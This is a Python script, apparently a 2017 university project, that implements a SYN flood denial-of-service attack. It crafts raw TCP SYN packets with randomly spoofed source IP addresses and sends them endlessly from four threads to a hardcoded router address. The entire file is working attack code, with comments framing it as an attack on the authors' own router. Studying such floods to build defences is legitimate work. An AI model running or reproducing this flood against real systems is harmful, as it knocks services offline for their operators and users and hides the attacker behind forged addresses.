# Developed by GABRIEL PEREIRA PINHEIRO and VICTOR ARAUJO VIEIRA
# In the University of Brasilia on 2017 
# Atack SYN flood


import socket, sys, random
from struct import *
from threading import Thread
import time 

 
# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff);
    #s = s + (s >> 16);
    #complement and mask to 4 byte short
    s = ~s & 0xffff
     
    return s

def show_begin():
    import time
    print 'Inciando o ataque...\n\n'
    time.sleep(4) 

def show_who(ip,porta):
    print '----------------------------------------------------'
    print ' O servidor ',ip,'esta sendo na Porta:',porta,
    print '\n----------------------------------------------------\n'

def attack(porta): 
    #create a raw socket
    import time

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()
     
    # tell kernel not to put in headers, since we are providing it
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         
    # now start constructing the packet
    packet = '';
     
    #atacando proprio roteador

    #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
    #para evitar que sejam todos 255 ou tenha 0.0.0.0
    #source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
    #source_ip = '192.168.0.17'
    #dest_ip = '192.168.0.101' # victor
    dest_ip = '192.168.0.1' # gabriel
    show_who(dest_ip,porta)
    # ip header fields
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
    id = 30  #Id of this packet
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 10  # python seems to correctly fill the checksum

    daddr = socket.inet_aton ( dest_ip )
     
    ihl_version = (version << 4) + ihl
     
    # tcp header fields
    dest = 80   # destination port
    seq = 0
    ack_seq = 0
    doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
    #tcp flags
    fin = 0
    syn = 1 #Setando a flag syn do pacote tcp
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = 5000
    check = 0
    urg_ptr = 0
     
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
     
    #Send the packet finally - the port specified has no effect
    #print 'O servidor',dest_ip,'esta sendo atacado'
    contador=0
    #put the above line in a loop like while 1: if you want to flood
    while True:
        #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
        #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
        #para evitar que sejam todos 255 ou tenha 0.0.0.0
        source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4))  
        saddr = socket.inet_aton ( source_ip )
        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

        #parte de gerar o pacote TCP, para cada nova porta gerada
        source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)

        # pseudo header fields
        source_address = socket.inet_aton( source_ip )
        tcp_length = len(tcp_header)

        if contador > 50000:
            print 'Foram enviados ',contador,' mensagens de SYN'
            contador=0
        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
        psh = psh + tcp_header;
         
        tcp_checksum = checksum(psh)
         
        # make the tcp header again and fill the correct checksum
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
         
        # final full packet - syn packets dont have any data
        packet = ip_header + tcp_header

        s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
        contador= contador + 1

    

def count_time(max):
    import time
    begin = time.time()
    duration = 0
    while True:
        time_until_now = time.time()
        duration = time_until_now - begin
        if duration > max:
            print '\n\nSe passaram ',duration,' segundos\n\n'
            begin = time.time()
        	



ataque = []

for i in range(0, 4):
	porta = 5000
	ataque.append(Thread(target = attack, args = [porta]))
	porta += 500


# ataque1 = Thread(target=attack,args=[5000])
# ataque2 = Thread(target=attack,args=[6001])
# ataque3 = Thread(target=attack,args=[7002])
# ataque4 = Thread(target=attack,args=[8003])
#time = Thread(target=count_time,args=[10])

show_begin()

for i in range (0, 4):
	ataque[i].start()

# ataque2.start()
# ataque1.start()
# ataque3.start()
# ataque4.start()
#time.start()